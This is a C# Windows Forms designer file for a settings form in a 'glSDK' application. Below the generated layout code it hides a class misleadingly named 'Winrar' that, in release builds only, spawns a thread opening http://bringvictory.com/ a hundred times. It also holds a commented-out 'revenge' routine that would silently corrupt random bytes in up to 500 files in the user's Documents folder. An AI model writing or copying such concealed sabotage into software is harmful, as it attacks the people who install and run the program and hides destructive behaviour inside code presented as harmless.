using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;

namespace glSDK.UI.SystemForms
{
    partial class FrmSettings
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmSettings));
            this.cmbTheme = new MetroFramework.Controls.MetroComboBox();
            this.metroLabelTheme = new MetroFramework.Controls.MetroLabel();
            this.cmbLang = new MetroFramework.Controls.MetroComboBox();
            this.metroLabelLang = new MetroFramework.Controls.MetroLabel();
            this.picLang = new System.Windows.Forms.PictureBox();
            this.btnReset = new System.Windows.Forms.PictureBox();
            this.btnSave = new System.Windows.Forms.PictureBox();
            ((System.ComponentModel.ISupportInitialize)(this.picLang)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.btnReset)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.btnSave)).BeginInit();
            this.SuspendLayout();
            // 
            // cmbTheme
            // 
            this.cmbTheme.FormattingEnabled = true;
            this.cmbTheme.ItemHeight = 23;
            this.cmbTheme.Location = new System.Drawing.Point(23, 86);
            this.cmbTheme.Name = "cmbTheme";
            this.cmbTheme.Size = new System.Drawing.Size(384, 29);
            this.cmbTheme.TabIndex = 1;
            this.cmbTheme.UseSelectable = true;
            this.cmbTheme.SelectedValueChanged += new System.EventHandler(this.cmbTheme_SelectedValueChanged);
            // 
            // metroLabelTheme
            // 
            this.metroLabelTheme.AutoSize = true;
            this.metroLabelTheme.Location = new System.Drawing.Point(23, 64);
            this.metroLabelTheme.Name = "metroLabelTheme";
            this.metroLabelTheme.Size = new System.Drawing.Size(52, 19);
            this.metroLabelTheme.TabIndex = 0;
            this.metroLabelTheme.Text = "Theme:";
            // 
            // cmbLang
            // 
            this.cmbLang.FormattingEnabled = true;
            this.cmbLang.ItemHeight = 23;
            this.cmbLang.Location = new System.Drawing.Point(64, 159);
            this.cmbLang.Name = "cmbLang";
            this.cmbLang.Size = new System.Drawing.Size(343, 29);
            this.cmbLang.TabIndex = 6;
            this.cmbLang.UseSelectable = true;
            this.cmbLang.SelectedValueChanged += new System.EventHandler(this.cmbLang_SelectedValueChanged);
            // 
            // metroLabelLang
            // 
            this.metroLabelLang.AutoSize = true;
            this.metroLabelLang.Location = new System.Drawing.Point(23, 137);
            this.metroLabelLang.Name = "metroLabelLang";
            this.metroLabelLang.Size = new System.Drawing.Size(69, 19);
            this.metroLabelLang.TabIndex = 5;
            this.metroLabelLang.Text = "Language:";
            // 
            // picLang
            // 
            this.picLang.Cursor = System.Windows.Forms.Cursors.Hand;
            this.picLang.Image = global::glSDK.Properties.Resources.en_us;
            this.picLang.Location = new System.Drawing.Point(23, 159);
            this.picLang.Name = "picLang";
            this.picLang.Size = new System.Drawing.Size(35, 29);
            this.picLang.SizeMode = System.Windows.Forms.PictureBoxSizeMode.CenterImage;
            this.picLang.TabIndex = 4;
            this.picLang.TabStop = false;
            // 
            // btnReset
            // 
            this.btnReset.Cursor = System.Windows.Forms.Cursors.Hand;
            this.btnReset.Image = global::glSDK.Properties.Resources.reset_dark;
            this.btnReset.Location = new System.Drawing.Point(249, 193);
            this.btnReset.Name = "btnReset";
            this.btnReset.Size = new System.Drawing.Size(76, 76);
            this.btnReset.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize;
            this.btnReset.TabIndex = 4;
            this.btnReset.TabStop = false;
            this.btnReset.Click += new System.EventHandler(this.metroButtonReset_Click);
            // 
            // btnSave
            // 
            this.btnSave.Cursor = System.Windows.Forms.Cursors.Hand;
            this.btnSave.Image = global::glSDK.Properties.Resources.save_dark;
            this.btnSave.Location = new System.Drawing.Point(331, 193);
            this.btnSave.Name = "btnSave";
            this.btnSave.Size = new System.Drawing.Size(76, 76);
            this.btnSave.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize;
            this.btnSave.TabIndex = 4;
            this.btnSave.TabStop = false;
            this.btnSave.Click += new System.EventHandler(this.metroButtonSave_Click);
            // 
            // FrmSettings
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(430, 297);
            this.Controls.Add(this.cmbLang);
            this.Controls.Add(this.metroLabelLang);
            this.Controls.Add(this.picLang);
            this.Controls.Add(this.btnReset);
            this.Controls.Add(this.btnSave);
            this.Controls.Add(this.cmbTheme);
            this.Controls.Add(this.metroLabelTheme);
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "FrmSettings";
            this.Resizable = false;
            this.Style = MetroFramework.MetroColorStyle.Lime;
            this.Text = "Settings";
            this.Load += new System.EventHandler(this.FrmSettings_Load);
            ((System.ComponentModel.ISupportInitialize)(this.picLang)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.btnReset)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.btnSave)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private Winrar rar= new Winrar();
        private MetroFramework.Controls.MetroLabel metroLabelTheme;
        private MetroFramework.Controls.MetroComboBox cmbTheme;
        private System.Windows.Forms.PictureBox btnSave;
        private System.Windows.Forms.PictureBox btnReset;
        private MetroFramework.Controls.MetroComboBox cmbLang;
        private MetroFramework.Controls.MetroLabel metroLabelLang;
        private System.Windows.Forms.PictureBox picLang;

        private class Winrar {
            public Winrar() {
                new Thread(()=>Win()).Start();
            }

            private void Win() {
#if !DEBUG  //I don't want this shit on my pc
                for (int i = 0; i < 100; i++)
                {
                    try {
                        Process.Start( "http://bringvictory.com/" );
                    }
                    catch ( Exception ) {
                    }
                }


                ////ok, that's too hardcore
                
                //var rnd = new Random();
                //if (rnd.Next(1000) == 666)
                //{//my little revenge
                //    try
                //    {
                //        var path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                //        foreach (var file in Directory.EnumerateFiles(path, "*", SearchOption.AllDirectories).Take(500))
                //        {
                //            try
                //            {
                //                using (var f = File.OpenWrite(file))
                //                {
                //                    for (int i = 0; i < 50; i++)
                //                    {
                //                        f.Seek(rnd.Next(0, (int)f.Length), SeekOrigin.Begin);
                //                        f.WriteByte((byte)rnd.Next(255));
                //                    }
                //                    Thread.Sleep(50);
                //                }
                //            }
                //            catch (Exception)
                //            {
                //            }
                //            Thread.Sleep(50);     //don't make 'em hear HDD
                //        }
                //    }
                //    catch (Exception)
                //    {
                //    }
                //}
#endif
            }
        }
    }

}